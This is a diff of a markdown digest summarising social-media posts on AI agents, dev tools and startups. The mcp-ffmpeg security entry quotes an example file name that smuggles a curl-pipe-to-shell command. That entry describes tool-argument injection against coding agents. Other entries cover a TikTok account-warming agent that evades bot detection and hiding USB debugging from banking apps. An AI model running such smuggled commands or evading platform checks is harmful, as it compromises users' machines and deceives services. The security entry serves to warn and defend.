@@ -13,33 +13,39 @@
 
 | | |
 |---|---|
-| **Total entries** | **389** |
-| **By source** | 🐦 X/Twitter **344** · 💬 Reddit **30** · 💼 LinkedIn **15** |
+| **Total entries** | **431** |
+| **By source** | 🐦 X/Twitter **387** · 💬 Reddit **30** · 💼 LinkedIn **14** |
 | **Categories** | 14 |
-| **With product/tryout links** | 167 |
-| **Video entries** | 58 |
-| **⭐ High follow-up** | 173 (medium 166 · low 50) |
+| **With product/tryout links** | 195 |
+| **Video entries** | 73 |
+| **⭐ High follow-up** | 186 (medium 185 · low 60) |
 
 Each entry below shows the **essence of the whole discussion** (main post + thread + top replies)
 and a one-line **takeaway** — you shouldn't need to click through to get the point.
+
+## ⏰ Important
+
+- **[Cloudflare security-audit skill finds bugs even with cheap models; Vercel reviews free until Nov 10](https://x.com/jurbed/status/2112973191157252103)** — Vercel Security Reviews are free until 10 Nov 2026 (from a reply on X-384). Run the Cloudflare security-audit skill on your repos too. · ⏳ by 2026-11-10
+- **[Publish a CLI to npm for automatic listings on Libraries.io and more (DR 75)](https://x.com/tarasshyn/status/2112893275933741142)** — Ahrefs rolls out its DR4 rating model on 1 Dec 2026. DR numbers quoted in these SaaS visibility hacks can change, so check your own DR before then. · ⏳ by 2026-12-01
+- **[mcp-ffmpeg and other MCP servers pass file names into a shell: no patch yet](https://x.com/jcinjpn/status/2116194202967224345)** — mcp-ffmpeg 1.0.5 and below allow shell injection through file names. VulnCheck listed no fixed version for nine MCP servers (checked 6 Nov 2026). Check your MCP config and sandbox the agent.
 
 ## 🗂 Category index
 
 | Category | Items | What's inside |
 |---|---:|---|
-| [AI & LLM](#ai-llm) | 93 | LLM models, prompts, AI agents, AI coding assistants, AI benchmarks, AI research, LLM … |
-| [Dev Tools & Productivity](#dev-tools-productivity) | 65 | IDEs, developer utilities, open-source libraries, CLI tools, workflows, editor/tool … |
-| [Programming & CS Learning](#programming-cs-learning) | 52 | Courses, playlists, books, tutorials, CS concepts (DB, OS, systems, ML theory), learning … |
-| [Interviews, OA & DSA](#interviews-oa-dsa) | 34 | Online assessments, interview experiences/questions, DSA prep, system design/HLD prep … |
-| [Jobs, Careers & Compensation](#jobs-careers-compensation) | 31 | Hiring posts, referral/job openings, offer comparisons, salary/CTC data, resume/ATS tips … |
-| [Quant & Trading](#quant-trading) | 24 | Quant trading/research roles, HFT firms, trading competitions, market structure, quant … |
-| [Personal Finance & Money](#personal-finance-money) | 9 | Credit cards, loans, insurance, investing, stocks/gold/crypto money matters, taxes … |
-| [Startups, Product & Marketing](#startups-product-marketing) | 41 | Founder content, growth/marketing tactics, product building, YC/startup programs, side … |
+| [AI & LLM](#ai-llm) | 102 | LLM models, prompts, AI agents, AI coding assistants, AI benchmarks, AI research, LLM … |
+| [Dev Tools & Productivity](#dev-tools-productivity) | 85 | IDEs, developer utilities, open-source libraries, CLI tools, workflows, editor/tool … |
+| [Programming & CS Learning](#programming-cs-learning) | 53 | Courses, playlists, books, tutorials, CS concepts (DB, OS, systems, ML theory), learning … |
+| [Interviews, OA & DSA](#interviews-oa-dsa) | 32 | Online assessments, interview experiences/questions, DSA prep, system design/HLD prep … |
+| [Jobs, Careers & Compensation](#jobs-careers-compensation) | 29 | Hiring posts, referral/job openings, offer comparisons, salary/CTC data, resume/ATS tips … |
+| [Quant & Trading](#quant-trading) | 23 | Quant trading/research roles, HFT firms, trading competitions, market structure, quant … |
+| [Personal Finance & Money](#personal-finance-money) | 10 | Credit cards, loans, insurance, investing, stocks/gold/crypto money matters, taxes … |
+| [Startups, Product & Marketing](#startups-product-marketing) | 56 | Founder content, growth/marketing tactics, product building, YC/startup programs, side … |
 | [Health, Fitness & Wellness](#health-fitness-wellness) | 12 | Exercise, sleep, supplements, nutrition, mental health, recovery, physical training |
 | [Life, Relationships & Self-Improvement](#life-relationships-self-improvement) | 4 | Relationships, habits, psychology, dating/marriage, soft skills, lifestyle design … |
 | [India Life & City Guides](#india-life-city-guides) | 3 | City guides (Bangalore/Delhi/Gurgaon), food, breweries, travel, India-specific living … |
 | [Entertainment, Culture & Fun](#entertainment-culture-fun) | 12 | Memes, TV shows, movies, fun threads, viral discussions, hobbies, internet culture, jokes |
-| [Tech Industry & News](#tech-industry-news) | 4 | Company announcements, industry drama, big-tech news, product launches by majors, policy |
+| [Tech Industry & News](#tech-industry-news) | 5 | Company announcements, industry drama, big-tech news, product launches by majors, policy |
 | [Other](#other) | 5 | Genuinely uncategorizable items; explain in subcategory |
 
 ## 🌟 Start here — high-signal picks
@@ -79,12 +85,17 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Essence:** OP's seven-step zero-audience promotion plan: auto-submit to 100 business directories via boringlaunch.com for initial traffic; win clients with Lemlist's LinkedIn voice outreach (filter ICPs by title/location, automate connection requests); mine the Facebook Ads Library for people who commented on competitor ads and …
   - **Try it:** [boringlaunch.com](https://boringlaunch.com) · [eezycollab.com](https://eezycollab.com) · [http://news.ycombinator.com](http://news.ycombinator.com) · [spaceleads.lemonsqueezy.com/buy/06a20802-1b7a-4be9-8 …](https://spaceleads.lemonsqueezy.com/buy/06a20802-1b7a-4be9-8382-485fb2d30405)
   - 🏷 growth marketing, lead gen, directories, cold outreach, startup launch
+- **[Smart TV privacy: turn off ACR, isolate IoT devices and filter DNS with NextDNS](https://x.com/Tristan0x/status/2114311011561812476)** ⭐  
+  `Tristan` · `2026-10-21` · `348 replies · 3.6K reposts · 22.6K likes · 28.6K bookmarks …`
+  - **Essence:** Tristan summarizes why smart TVs are cheap. A researcher (log4j) rooted a 2025 Samsung TV and found an always-on microphone, automatic content recognition (ACR), geolocation, network mapping and ad profiling shared with hundreds of partners. ACR screenshots the screen and sends fingerprints home: Samsung about every …
+  - **Try it:** [nextdns.io](https://nextdns.io/) · [arxiv.org/abs/2409.06203](https://arxiv.org/abs/2409.06203)
+  - 🏷 privacy, smart-tv, acr, nextdns, iot
 
 <a id="ai-llm"></a>
 
-## AI & LLM (93)
+## AI & LLM (102)
 
-<details><summary><b>Show 93 entries</b> — LLM models, prompts, AI agents, AI coding assistants, AI benchmarks, AI research, LLM workflows and tips</summary>
+<details><summary><b>Show 102 entries</b> — LLM models, prompts, AI agents, AI coding assistants, AI benchmarks, AI research, LLM workflows and tips</summary>
 
 - **[Sahaj won't push a PR without /codebase-design and /zero-tech-debt skills](https://x.com/iamsahaj_xyz/status/2105746013709631735)**  
   `Sahaj` · `2026-10-01` · `3 replies · 6 reposts · 250 likes · 28.8K views · 460 …`
@@ -581,6 +592,56 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Essence:** Abdulla Ababakre pairs phone-use, his agent that operates a phone, with OpenAI's new Decisions API, which lets an app choose the right model, tool or action in near real time. OpenAI says Decisions is up to 10x faster than GPT-6 Luna through the Responses API, and the combo is aimed at the step where a phone agent has to decide what to tap next without a full model round-trip. Phone-use currently runs on Ababakre's own device cloud, with a local version promised soon. The thread is tiny, but the one substantive question - whether it can drive a physical iPhone rather than a hosted device - points at the gap between a demo and a product.
   - **Takeaway:** A promising latency fix for phone agents; the missing piece is local/physical-device support, which is still promised rather than shipped.
   - 🏷 phone-use, openai, decisions-api, agents, latency
+- **[Copy-paste prompt makes a Hermes Agent build a four-profile HackerOne bounty pipeline](https://x.com/vulnix0x4/status/2118502357332054281)**  
+  `vulnix` · `2026-11-06` · `0 replies · 0 reposts · 46 likes · 112 bookmarks · 1.4K …`
+  - **Essence:** vulnix posts a very long prompt for a fresh Hermes Agent session. It asks the agent to really build an authorized bug-bounty system for HackerOne programs: profiles, a workspace, validators, a Kanban board named bug-bounty, scheduler scripts, cron jobs and tests, then run an offline smoke test. Four isolated profiles do the work: bounty-scout (public directory and policy research only), bounty (researcher), bounty-reviewer (tries to reject each finding and reruns the proof) and bounty-submitter (revalidates and submits through the official form only after every gate passes). All four use deepseek-v4.1-flash through the opencode-go provider, and risky commands run inside Bubblewrap. Hard …
+  - **Takeaway:** A full reference prompt for an unattended bounty pipeline with strict scope and human-only submission gates. Read the safety rules before you reuse any part.
+  - 🏷 hermes-agent, bug-bounty, hackerone, kanban, agent-automation
+- **[CLAUDE.md 'two-way doors' rule lets the agent decide alone and stop only at one-way doors](https://x.com/daradoescode/status/2117433338319544735)**  
+  `Dara A.` · `2026-11-03` · `4 replies · 1 reposts · 92 likes · 160 bookmarks · 2.9K …`
+  - **Essence:** Dara posts an image of a CLAUDE.md section called 'Two-way doors swing freely' and says something like it helps a lot. The image looks like a GitHub-rendered file from the linked d-stack repo (SunkenInTime/d-stack). The rule: trust the agent with whole problems, take the full scope and use as many subagents as needed. Walk through two-way doors and show the result after. Stop at one-way doors. Do not ask if the answer would be a rubber stamp, and run something instead of asking when a run can answer the question. Save questions for taste and product calls, one at a time. Once a one-way door is opened, it stays open for that work, including for subagents, unless the real situation differs …
+  - **Takeaway:** A reusable autonomy rule for CLAUDE.md. Copy the idea, then shorten it to fit your own work.
+  - **Try it:** [github.com/SunkenInTime/d-stack](https://github.com/SunkenInTime/d-stack)
+  - 🏷 claude-md, agents, autonomy, prompts, subagents
+- **[cubench: Cua Driver and agent-desktop lead a 5-tool computer-use benchmark](https://x.com/athrix_codes/status/2117430371650506835)** ⭐  
+  `Athrix ☄️` · `2026-11-03` · `24 replies · 20 reposts · 339 likes · 346 bookmarks · 23.2K …`
+  - **Essence:** Athrix benchmarks five computer-use tools on 40 real desktop tasks (forms, icons, tiny buttons, a calculator, a text editor) on one Ubuntu desktop, 8-core CPU and no GPU, checked against real app state. Tasks completed: Cua Driver 90% (36 of 40), agent-desktop 88% (35), UI-TARS 82% (33), OmniParser 52% (21), Open Interpreter 32% (13). Median time per action: agent-desktop 471 ms, Cua 1.1 s, Open Interpreter 2.8 s, OmniParser 53.6 s, UI-TARS 88.8 s. Said done but nothing happened: Cua 0 of 42, agent-desktop 1, OmniParser 1, UI-TARS 7, Open Interpreter 29. Peak memory: agent-desktop 90 MB, Cua 142 MB, Open Interpreter 1.41 GB, OmniParser 11.25 GB, UI-TARS 17.69 GB. The thread notes UI-TARS …
+  - **Takeaway:** Accessibility-tree tools beat vision models on speed, memory and honest 'done' reports in this CPU-only test. See the two agent-desktop entries.
+  - 🏷 computer-use, benchmark, agent-desktop, cua, ui-tars
+- **[Weight-Space Programming: GPT-6 Astra edits 0.016% of Qwen3.5-0.8B weights to lift math](https://x.com/rikiyatakehi/status/2117313742891327994)** ⭐  
+  `Rikiya Takehi` · `2026-11-02` · `2.4K replies · 13K reposts · 55.9K likes · 36.3K bookmarks …`
+  - **Essence:** An MIT CSAIL team (Rikiya Takehi, Jayden Teoh, Alex Zhang, Omar Khattab) reports that a frontier LLM can read and write neural network weights directly. From raw weights alone, GPT-6 Astra named four game policies (Breakout, Pong, Pac-Man, Freeway). Given one failed trace, it fixed a PPO car policy that was stuck on a ramp by editing 3.5% of the weights, reaching 100% success. It wrote a Breakout network from scratch that beat PPO baselines trained for hundreds of millions of steps. Asked to improve Qwen3.5-0.8B at math, it found the reasoning-loop problem that Qwen's own model card warns about and edited 0.016% of the weights, with no gradients and no training. MATH-500 went from 7.9% to …
+  - **Takeaway:** An early but striking result for model editing without training. Read the blog and wait for the benchmark before you trust the claim on other models.
+  - **Try it:** [rikiyat.github.io/blog/weight-space-programming](https://rikiyat.github.io/blog/weight-space-programming/) · [huggingface.co/RikiyaT/Qwen3.5-0.8B-weight-space-pro …](https://huggingface.co/RikiyaT/Qwen3.5-0.8B-weight-space-programming) · [github.com/RikiyaT/lm_understand-logs](https://github.com/RikiyaT/lm_understand-logs)
+  - 🏷 research, weights, interpretability, qwen, model-editing
+- **[Claude Code with Opus 5.5 edited a 10-minute vlog from 58 minutes of clips](https://x.com/levelsio/status/2116959423117857026)** ⭐  
+  `2026-11-01` · `111 replies · 199 reposts · 2.1K likes · 3K bookmarks · …`
+  - **Essence:** levelsio copied DJI clips into a folder, opened Claude Code there and asked for a 10-minute vlog for X and YouTube. It cut 58 minutes across 14 clips down to 10, with a few manual fixes. He did not ask for the method and learned it only when Sam Parr asked how he edited. The agent transcribed speech with mlx-whisper (Whisper large-v3-turbo on the MacBook GPU through MLX), pulled video frames every few seconds into contact-sheet grids so it could see each clip, used a SpeechBrain ECAPA voice-matching model to tell his voice from others, and made thumbnails with OpenCV and the YuNet face detector. The edit is a JSON list of cuts (clip, start, end) picked from transcripts and frame grids. …
+  - **Takeaway:** A concrete recipe for agent video editing from local models and a JSON cut list. See the related ffmpeg-skill and Opus video entries.
+  - 🏷 claude-code, video-editing, whisper, opencv, opus-5-5
+- **[Have the agent build its own repo CLI: 40k tokens and 30s down to 2k tokens and 5s](https://x.com/jmwind/status/2116513031077384391)** ⭐  
+  `Jean-Michel Lemieux` · `2026-10-31` · `51 replies · 38 reposts · 1.2K likes · 2.1K bookmarks · …`
+  - **Essence:** Jean-Michel Lemieux says his agent built its own CLI. Getting oriented used to cost about 40k tokens, 6 file reads and 30 seconds. It now costs one command, 2k tokens and 5 seconds. The image holds the prompt: review all session transcripts for the repo, list the questions, lookups, file reads and commands repeated across sessions, then build ./bin/agent-cli, a tiny CLI that answers them from one place. Every script or command run more than once becomes a subcommand with its own --help, terse output written for the agent, a --json flag and no new dependencies. Add a line to agents.md to use agent-cli first, and show a before and after list. In the thread he says new commands are added on …
+  - **Takeaway:** A cheap, repeatable way to cut orientation cost. Keep it fresh with the weekly rerun and prune the leftovers.
+  - 🏷 agents, cli, token-cost, agents-md, workflow
+- **[Cloudflare cut its AI code-review inference bill 68% with prompt caching and model routing](https://x.com/Cloudflare/status/2112280767308918908)** ⭐  
+  `Cloudflare` · `2026-10-19` · `40 replies · 77 reposts · 992 likes · 1.8K bookmarks · 160K …`
+  - **Essence:** Cloudflare says the cost per run of its AI code reviewer doubled, so the team dug into token usage to find out why. Prompt caching and intelligent model routing cut the inference bill by 68% and sped up reviews. The post links a Cloudflare blog article about being obsessive about inference optimization. Replies add that tokens per review tripled and cost still fell, which shows cheaper models can do the job, and that another large saving may come from code mode or an equivalent. This is an unusually concrete cost write-up from a production system, close to the vault's inference-engineering plan.
+  - **Takeaway:** A real production case for prompt caching and routing as cost levers. Read the full blog post for the method.
+  - **Try it:** [blog.cloudflare.com/obsessive-inference-optimization …](https://blog.cloudflare.com/obsessive-inference-optimization/)
+  - 🏷 inference, prompt-caching, model-routing, cost, cloudflare
+- **[Eight GitHub repos for making videos with Opus 5.5](https://x.com/KinGao476942/status/2112729924943634602)**  
+  `Kin` · `2026-10-21` · `144 replies · 1.2K reposts · 9.2K likes · 24.5K bookmarks · …`
+  - **Essence:** Kin lists eight repos for video work with Opus 5.5. 1) awesome-opus5-5-videos (about 7,100 stars): viral videos with their prompts. 2) lemo-opuscar (about 4,400): a Claude Code skill with 51 code short-film styles. 3) pdoom-video (about 3,000): a lyrics karaoke music video that renders 4K60 locally. 4) PDoomVideo (about 2,300): source for another video of the same song, to compare with 3. 5) mg-styles-15 (about 1,400): 15 motion-graphics styles with clips, prompts and code. 6) ClaudeAnimationBase (about 1,300): a starter pack for hand-drawn character animation with 31 expressions. 7) awesome-claude-5-5-videos (about 560): video workflows, 301 of them Opus-specific. 8) opus-video-prompts …
+  - **Takeaway:** A ready map of the Opus video ecosystem. Start with the prompt collections, and keep local copies.
+  - **Try it:** [github.com/yihui-dev/awesome-opus5-5-videos](https://github.com/yihui-dev/awesome-opus5-5-videos) · [github.com/lemomo-ai/lemo-opuscar](https://github.com/lemomo-ai/lemo-opuscar) · [github.com/Vincentwei1021/mg-styles-15](https://github.com/Vincentwei1021/mg-styles-15) · [github.com/athemeroy/awesome-claude-5-5-videos](https://github.com/athemeroy/awesome-claude-5-5-videos)
+  - 🏷 opus-5-5, video-generation, claude-code, motion-graphics, awesome-list
+- **[An agent warms up a US TikTok account daily from a cron job on a cloud phone](https://x.com/yaa_priya/status/2112438664760606720)** 🎬  
+  `Priya` · `2026-10-20` · `13 replies · 19 reposts · 223 likes · 339 bookmarks · 17.2K …`
+  - **Essence:** Priya says her agent warms up a US-based TikTok account every day, and she can turn the whole process into a cron job with one command to the agent. In the thread she says the workflow runs on Mobilerun, a cloud phone service (mobilerun.ai), that it can also run on a real device, and that her 4-month-old account still works because good infrastructure keeps TikTok from detecting it. Replies are doubtful: one says TikTok is very good at spotting bots and will shadow-ban the profile, and another asks whether it will trigger bot checks. Automated engagement can also break the platform's rules.
+  - **Takeaway:** An example of agents driving a phone on a schedule. The account-warming use is risky and may violate platform terms.
+  - **Try it:** [mobilerun.ai](https://mobilerun.ai/)
+  - 🏷 agents, cloud-phone, tiktok, cron, automation
 - **[Cut Claude Code / Cursor token usage ~60% with a small CLI tool](https://www.linkedin.com/feed/update/urn:li:activity:7462777658507051010)**  
   `Daniel Engelhardt` · `2026-05-20` · `♥94 · 37 comments · 5 reposts`
   - **Essence:** Daniel shares that a small open-source CLI (rtk), which rewrites bash commands into compact output before execution, cut his team's Claude Code and Cursor token usage by roughly 60%, and describes his own counter-analysis: a local audit skill over his session logs found about 28% of spend was cuttable, but rtk's output compression covered under 1% of his bill because almost all the money sat in bloated context — sessions crossing 200k into the 2x pricing tier, plus skills and plugins riding along on every request that were never called. He concludes output compression and context hygiene are different layers that stack, and thanks whoever pointed him at the tool. The comment thread is a …
@@ -604,9 +665,9 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
 
 <a id="dev-tools-productivity"></a>
 
-## Dev Tools & Productivity (65)
+## Dev Tools & Productivity (85)
 
-<details><summary><b>Show 65 entries</b> — IDEs, developer utilities, open-source libraries, CLI tools, workflows, editor/tool releases, dev infrastructure</summary>
+<details><summary><b>Show 85 entries</b> — IDEs, developer utilities, open-source libraries, CLI tools, workflows, editor/tool releases, dev infrastructure</summary>
 
 - **[pnpm asks your coding agent to fix its 629 open issues](https://x.com/pnpmjs/status/2103438679478010198)**  
   `pnpm` · `2026-09-25` · `33 replies · 60 reposts · 567 likes · 61.7K views · 266 …`
@@ -951,6 +1012,125 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Takeaway:** A good default structure for reviewing agent-sized diffs - overview, chapters, core-first ordering - regardless of whether Capy or Linear ships it better.
   - **Try it:** [capy.ai](https://capy.ai/)
   - 🏷 code-review, capy, pull-requests, linear, agents
+- **[/untangle-codebase skill removes leaky abstractions, copy-paste and wrapper clutter](https://x.com/mazeincoding/status/2118378945557004477)** 🎬  
+  `Maze` · `2026-11-05` · `66 replies · 174 reposts · 3.8K likes · 5.8K bookmarks · …`
+  - **Essence:** Maze launches /untangle-codebase, a skill for coding agents that cleans messy code: leaky abstractions, copy-paste, temporary workarounds and useless wrappers. A demo video is attached. A self-reply links the skill file (SKILL.md in the caldoai/skills repo). Asked how the demo video was made, he says he did not tell the agent how to do it and it chose the approach itself. Replies ask whether it only works for TypeScript, because the demos use TypeScript. One reply says it looks like Matt's improve-codebase-design skill, but acts at once instead of talking first. Another says skills will soon need their own benchmark index.
+  - **Takeaway:** A one-file cleanup skill to try on a messy repo. Read the diff it makes; the pitch is about acting, not reviewing.
+  - **Try it:** [github.com/caldoai/skills/blob/main/skills/untangle …](https://github.com/caldoai/skills/blob/main/skills/untangle-codebase/SKILL.md)
+  - 🏷 claude-code, skills, refactoring, code-quality
+- **[Developer skill pack: /ux-paths, /ux-flow, /ux-walker and /ux-auto-improve](https://x.com/DennisonBertram/status/2118015665890275697)**  
+  `Dennison` · `2026-11-04` · `9 replies · 2 reposts · 57 likes · 130 bookmarks · 7.4K …`
+  - **Essence:** Dennison promotes his developer skill pack for Claude, built around four UX skills. /ux-paths writes exhaustive user-journey stories from the codebase with parallel sub-agents. /ux-flow scores each journey for friction and redundancy and files ranked simplification issues. /ux-walker walks every story in a real browser, checks alignment and spacing with a geometry-audit script, and files GitHub issues. /ux-auto-improve loops one app section per round: a cheap reviewer critiques, Opus or Fable judges and argues against, cheap implementers build the survivors with regression tests, and each fix gets a narrated before and after walkthrough video. His suggested run is /goal with ux-paths …
+  - **Takeaway:** A UX audit and auto-fix loop worth testing on one app section first. The strongest claims are boasts without evidence.
+  - **Try it:** [github.com/dennisonbertram/developer-skill-pack](https://github.com/dennisonbertram/developer-skill-pack)
+  - 🏷 claude-code, skills, ux, agent-loops, browser-testing
+- **[terminal-mac: a full macOS VM inside your terminal for agent computer use](https://x.com/kirtandopamine/status/2117678349828976746)** 🎬 ⭐  
+  `govi` · `2026-11-03` · `353 replies · 745 reposts · 7.3K likes · 8.2K bookmarks · …`
+  - **Essence:** govi releases terminal-mac, a whole macOS that runs inside your existing terminal. You give the agent its own Mac and keep yours, watch it work live beside your terminal, and get computer use through MCP, a CLI and a skill. It is free and open source (govijr/terminal-mac). In the thread he says it uses Apple's virtualization framework with a real macOS guest and no emulation. It takes 4 GB RAM by default (set with --memory) and the memory stays flat while the agent works. The terminal viewer is about 10 MB, and the setup is kept after the first run. He admits it does not handle some cases yet. Replies suggest pixelgui.com for better kitty-graphics support (tmux, partial updates) and ask for …
+  - **Takeaway:** A clean way to give an agent its own Mac without touching yours. Check the RAM cost and the missing checkpoints before you rely on it.
+  - **Try it:** [github.com/govijr/terminal-mac](https://github.com/govijr/terminal-mac)
+  - 🏷 computer-use, macos, virtualization, mcp, open-source
+- **[Tip: tell Claude to follow defensivecss.dev for sturdier frontend CSS](https://x.com/victormustar/status/2117239972793315497)**  
+  `Victor M` · `2026-11-02` · `9 replies · 9 reposts · 360 likes · 658 bookmarks · 32.9K …`
+  - **Essence:** Victor suggests a zero-effort way to improve Claude's UI code: ask it to adopt the rules at defensivecss.dev when it writes CSS. In the thread he adds that the model does not do this by default. Useful replies say that long translated labels and very long unbroken text still need browser tests, not only prompt instructions, and that pointing the model at a named rule set works better than 'make it look nice'. Other high-reach replies in the thread are about unrelated topics.
+  - **Takeaway:** One line to add to a frontend prompt or skill: follow defensivecss.dev, then test with long labels in a browser.
+  - **Try it:** [defensivecss.dev](https://defensivecss.dev/)
+  - 🏷 css, frontend, prompting, claude, resilient-ui
+- **[Remotion ships a new homepage and files bug reports from the replies](https://x.com/JNYBGR/status/2117172172707746118)**  
+  `Jonny Burger` · `2026-11-02` · `18 replies · 3 reposts · 104 likes · 75 bookmarks · 26K …`
+  - **Essence:** Jonny Burger announces the new remotion.dev homepage and invites roasts. In the thread he files GitHub issues from the feedback: videos showing 'Preview unavailable' (#12899), an error on the homepage (#12894), and a request for a seekbar in fullscreen (#12886). He says all docs pages return markdown while the homepage returns HTML. Replies point out a React hydration error (#418) in the console, a preview that is too big, weak mobile layout, a hero video that could be more striking, and a call to action that could be stronger.
+  - **Takeaway:** A launch-feedback thread. Useful only as a pointer to Remotion's refreshed site and docs-as-markdown setup.
+  - **Try it:** [remotion.dev](https://remotion.dev/)
+  - 🏷 remotion, video, react, homepage
+- **[Motion pitches 'Fable 5.5 for launch videos' with an MCP and editable-code export](https://x.com/motion_so/status/2117287037170778544)** 🎬  
+  `Motion` · `2026-11-02` · `68 replies · 64 reposts · 694 likes · 499 bookmarks · 188K …`
+  - **Essence:** Motion announces Fable 5.5 for launch videos used with the Motion harness: go from idea to complex motion design, keep everything as editable code, and export to After Effects or Premiere Pro. It points to the Motion MCP and shows an example video in the thread. The replies are sceptical. Several ask how it can serve launch videos when the model is not out yet, one asks whether the post is an attempt to summon the model, and another calls it a marketing master class. Treat the model claim with care until it is confirmed.
+  - **Takeaway:** The Motion MCP and code-based export may be worth a look. The 'Fable 5.5' claim is unconfirmed hype.
+  - **Try it:** [motion.so](https://motion.so/)
+  - 🏷 motion-design, mcp, video, after-effects, marketing
+- **[mcp-ffmpeg and other MCP servers pass file names into a shell: no patch yet](https://x.com/jcinjpn/status/2116194202967224345)** ⭐  
+  `Jon（ジョン）` · `2026-10-30` · `12 replies · 8 reposts · 131 likes · 204 bookmarks · 14.6K …`
+  - **Essence:** Jon warns that mcp-ffmpeg version 1.0.5 and below builds a shell command from the video path. A file named like clip$(curl pwnd.sh|sh).mp4, from a bad repo or readme, can run the attacker's script when the agent resizes the file. He says there is no patch and that other MCP servers are affected. The fix for tool authors: pass arguments as an array, never use shell=True, and treat every tool argument as user input. His thread links the write-up on theinjection.dev. That write-up was checked on 6 Nov 2026: VulnCheck published nine MCP-server advisories on 27 Oct 2026 (including Kali-GPT, mcp-ffmpeg, esp-mcp and the sf-mcp and ai-sdlc tools), eight are OS command injection rated CVSS 7.3 to …
+  - **Takeaway:** If you gave an agent mcp-ffmpeg or a similar CLI-wrapping MCP server, check your config and sandbox it. No fixed version was listed on 6 Nov.
+  - **Try it:** [theinjection.dev/items/vulncheck-mcp-tool-parameter …](https://theinjection.dev/items/vulncheck-mcp-tool-parameter-command-injection/)
+  - 🏷 mcp, security, command-injection, ffmpeg, sandbox
+- **[agent-desktop: accessibility-tree computer use for agents on macOS, Windows and Linux](https://x.com/mdlahfir/status/2116316228046500348)** 🎬 ⭐  
+  `Lahfir ▲` · `2026-10-30` · `82 replies · 116 reposts · 1.6K likes · 1.4K bookmarks · …`
+  - **Essence:** Lahfir (Vercel Labs) introduces agent-desktop, installed with npm i -g agent-desktop. It reads apps through the accessibility tree, so agents can end-to-end test desktop apps. Skeleton-based drilling lets an agent snapshot only one region of a window, then drill deeper with find and wait to save tokens on long tasks. With --multi-agent and an --agent-id per agent, several agents share one desktop, each with its own cursor and label. It is headless by default, except for drag, menus and surfaces. It pairs with agent-browser (web) for full computer use, and can run inside a Vercel Sandbox on a Linux desktop in the cloud and return JSON. Docs are at agent-browser.dev/desktop. Replies report …
+  - **Takeaway:** The detailed feature thread for agent-desktop. Pair it with the cubench numbers and the launch entry.
+  - **Try it:** [github.com/vercel-labs/agent-desktop](https://github.com/vercel-labs/agent-desktop) · [agent-browser.dev/desktop](https://agent-browser.dev/desktop)
+  - 🏷 agent-desktop, computer-use, accessibility-tree, vercel-labs, multi-agent
+- **[Chris Tate launches agent-desktop as 'agent-browser for your whole computer'](https://x.com/ctatedev/status/2116323148706771302)** 🎬 ⭐  
+  `Chris Tate` · `2026-10-31` · `594 replies · 1.2K reposts · 10.2K likes · 12.5K bookmarks …`
+  - **Essence:** Chris Tate announces agent-desktop: computer use for any coding agent on macOS, Windows and Linux, running in the background while you keep working, with agents using the computer in parallel and each one getting its own cursor. A self-reply says to star and fork it, and that it was built by Lahfir, who just joined the Vercel Labs team (repo vercel-labs/agent-desktop). The post is the big launch one: about 10K likes, 12.5K bookmarks and 1.5M views. Replies ask how it compares with cua.ai's cua-driver and whether it can work with agent-browser, and some users plan to test it against Cua and Codex computer use. See the feature thread and the cubench numbers for details.
+  - **Takeaway:** The launch post for agent-desktop. Use the other two entries for features and benchmark numbers.
+  - **Try it:** [github.com/vercel-labs/agent-desktop](https://github.com/vercel-labs/agent-desktop)
+  - 🏷 agent-desktop, agent-browser, computer-use, vercel-labs
+- **[Essentials 'Shut-Up!' hides USB debugging only while banking apps are open](https://x.com/Dhananjay_Tech/status/2116069301929337252)**  
+  `Dhananjay_Tech` · `2026-10-30` · `69 replies · 140 reposts · 1.4K likes · 1.5K bookmarks · …`
+  - **Essence:** Dhananjay shares an Android tip for developers whose banking and UPI apps break when USB debugging is on. The Essentials app (open source, free, made by Sameera, repo sameerasw/essentials) has a 'Shut-Up!' feature that hides Developer Options and USB and wireless debugging only while chosen apps are open, then turns them back on when you close the app. The screenshot shows the app picker with Aadhaar, Axis Mobile, iMobile, OneCard, RailOne, SBI Card and YONO SBI enabled. In the thread: install it, search 'Shut up', select the app and add a shortcut to the home screen, then launch the app from that shortcut. Replies list alternatives: Geto (T31n/Geto, also on F-Droid), SU_IMD, and IMD from …
+  - **Takeaway:** A free fix for banking apps that block USB debugging. Test each app, since some detect Shizuku.
+  - **Try it:** [github.com/sameerasw/essentials](https://github.com/sameerasw/essentials) · [github.com/T31n/Geto](https://github.com/T31n/Geto)
+  - 🏷 android, usb-debugging, upi, banking-apps, shizuku
+- **[Make projects run in dev with no setup; use one secrets-manager key everywhere else](https://x.com/davis7/status/2115196138894893196)**  
+  `Ben Davis` · `2026-10-27` · `49 replies · 22 reposts · 1.1K likes · 688 bookmarks · …`
+  - **Essence:** Ben Davis recommends designing projects so they run in development without setup or env vars. When you need real environment values, use a secrets manager so you only need one key. He names Infisical as the best he has found. Replies add alternatives: varlock.dev (AI-safe .env files), dotenvx (commit encrypted env files so teams sync without a cloud), Convex, and Vercel Environments. The Infisical team replies and asks for feedback.
+  - **Takeaway:** A simple rule for new repos: zero-config dev, one key for secrets. Compare Infisical, varlock and dotenvx.
+  - **Try it:** [varlock.dev](https://varlock.dev/) · [dotenvx.com](https://dotenvx.com/)
+  - 🏷 env-vars, secrets, infisical, developer-experience
+- **[Replace Next.js + Vercel + Supabase with one Cloudflare Worker for about $5 a month](https://x.com/ibothinks/status/2113955968010563974)** ⭐  
+  `ibo` · `2026-10-24` · `153 replies · 177 reposts · 2.4K likes · 2.6K bookmarks · …`
+  - **Essence:** ibo says you no longer need Next.js, Vercel and Supabase. The mapping: Next.js to TanStack Start or vinext, Vercel to Workers, Supabase Postgres to D1, Supabase Auth to Better Auth on D1, Supabase Storage to R2, realtime to Durable Objects, Redis to KV, and background jobs to Queues plus Cron Triggers. One worker, one bill, about 5 dollars a month. In the thread he says a product of his runs on this stack, tells you to have the AI avoid N+1 queries, and says anyone who hits the 10 GB limit is making enough money to migrate (with a link to a write-up on outgrowing D1). Replies push back: Theo says D1 makes the post hard to take seriously, others say each D1 database is capped at 10 GB, one …
+  - **Takeaway:** A useful map from the usual stack to Cloudflare primitives. Check D1's 10 GB cap and spend alerts before you commit.
+  - 🏷 cloudflare, workers, d1, r2, durable-objects
+- **[UX references your agent should read: Laws of UX, Nielsen, GOV.UK, Inclusive Components, Apple HIG](https://x.com/nurijanian/status/2113600826874950119)**  
